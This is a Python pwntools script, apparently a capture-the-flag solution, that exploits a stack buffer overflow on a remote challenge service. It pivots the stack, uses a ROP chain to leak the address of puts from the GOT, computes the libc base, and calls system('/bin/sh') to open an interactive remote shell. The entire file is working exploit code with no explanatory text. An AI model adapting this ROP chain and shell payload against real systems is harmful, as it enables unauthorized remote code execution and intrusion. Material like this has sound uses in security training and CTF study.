#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10132)

context.arch = 'amd64'

libc = ELF('./libc.so.6')

payload = 'a' * 48

pop_rdi = 0x00000000004006b3
pop_rdx = 0x00000000004006d4
pop_rsi_r15 = 0x00000000004006b1
leave = 0x000000000040064a
read_plt = 0x00000000004004e0
puts_plt = 0x00000000004004d8
puts_got = 0x600fd8
buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100

rop = flat([buf1, pop_rdi, 0, pop_rsi_r15, buf1, 0, pop_rdx, 0x100, read_plt, leave])

r.recvuntil(':')
r.send(payload + rop)

rop2 = flat([buf2, pop_rdi, puts_got, puts_plt, pop_rdi, 0, pop_rsi_r15, buf2, 0, pop_rdx, 0x100, read_plt, leave])
r.sendline(rop2)
r.recvuntil('\n')
puts_addr = u64(r.recvline().strip().ljust(8, '\x00'))
base = puts_addr - libc.symbols['puts']
system = base + libc.symbols['system']

rop3 = flat([buf1, pop_rdi, buf2 + 4 * 8, system, '/bin/sh\x00'])
r.sendline(rop3)

r.interactive()
